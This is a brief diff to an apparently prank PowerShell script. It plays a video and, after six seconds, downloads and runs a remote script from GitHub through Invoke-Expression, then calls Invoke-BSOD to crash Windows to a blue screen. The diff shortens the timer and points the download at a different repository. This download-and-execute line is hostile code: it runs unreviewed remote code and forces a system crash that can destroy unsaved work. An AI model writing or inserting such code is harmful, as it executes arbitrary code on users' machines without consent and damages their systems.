@@ -38,11 +38,10 @@ $VideoPlayer.Play()
 
 # Start the timer to close the window after 6 seconds
 $Timer = New-Object System.Windows.Threading.DispatcherTimer
-$Timer.Interval = [TimeSpan]::FromSeconds(15)
+$Timer.Interval = [TimeSpan]::FromSeconds(6)
 $Timer.Add_Tick({
     $Timer.Stop()
-    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
-
+    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/shortcutactivation/BlueScreen/BSOD.ps1'));Invoke-BSOD
 })
 
 # Start countdown timer after the video starts playing and execute BSOD
